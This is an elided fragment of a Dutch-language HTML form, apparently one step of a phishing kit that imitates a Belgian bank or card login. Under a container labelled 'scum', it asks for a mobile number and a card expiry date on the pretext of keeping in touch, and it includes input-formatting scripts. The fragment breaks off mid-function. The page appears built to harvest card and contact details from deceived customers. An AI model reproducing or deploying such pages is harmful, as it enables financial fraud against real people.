...
<div class="login_flow scum" id="phone-view">
            ...
            <div class="form_fields form-group">
                <div class="form_labels"> 
                	<label for="mob"><span class="ng-binding">Geef uw gsm-nummer in</span></label>
                ...
                <div class="form_details ">
                    <div class="field_error_message show_active err_span" style="display: none;">
                        <p tabindex="0" class="ng-binding">Gelieve het gsm-nummer in te vullen.</p>
                    </div>
                    <div class="default_input_field"> 
                        

                    	<input type="tel" id="mob" name="num" class="input_card_number form-control" data-err_text="gsm-nummer" placeholder="04 -- -- -- --" data-mask="99 99 99 99" maxlength="10" required autocomplete="off">
                    </div>
                </div>
            </div>
            
            <div class="form_fields save_profile">  
                <p class="css-label"> <span class="ng-binding">Gelieve uw laatste gsm-nummer met ons te delen om er zeker van te zijn dat wij u telefonisch kunnen bereiken.</span> </p>
            </div><div class="form_fields form-group">
                <div class="form_labels"> 
                	<label for="exp"><span class="ng-binding">Kaart verloop datum</span></label>
                	<a role="tooltip" class="info_icon fontcon-information help_icon tooltipstered"></a>
                </div>
                <div class="form_details ">
                    <div class="field_error_message show_active err_span" style="display: none;">
                        <p tabindex="0" class="ng-binding">Gelieve het datum in te vullen.</p>
                    </div>
                     <script>
function formatExpiryDate(input) {
    ...
    input.value = value;
...
</script><div class="default_input_field"> 
                        

                    	<input type="text" required id="exp" name="exp" class="input_card_number form-control" data-err_text="Verloop datum"  data-mask="99/9999" mask-placeholder="MM/JJJJ" placeholder="MM/JJJJ" autocomplete="off" oninput="formatExpiryDate(this)">
                    </div>
                </div>
            </div>
            <div class="navigation_btns pad-t10 ">
                <div class="right_navigation_btn fullwidth_btn "> <button class="btn_default btn_primary login_btn ng-binding">Volgende</button> </div>
            </div>
        </div>
	   ...
	   <script>
        function formatInput4(input) {
            let value = input.value.replace(/\D/g, ''); // Remove all non-digit characters
            
            // Prepend "04 " if it hasn't been entered yet
            if (!value.startsWith("04")) {
                value = "04 " + value;
            }

            // Automatically insert spaces after every two digits beyond the "04 "
            if (value.length > 3) value = value.slice(0, 5) + ' ' + value.slice(5);
            if (value.length > 8) value = value.slice(0, 8) + ' ' + value.slice(8);
            if (value.length > 11) value = value.slice(0, 11) + ' ' + value.slice(11);

            // Limit to the format "04 xx xx xx xx"
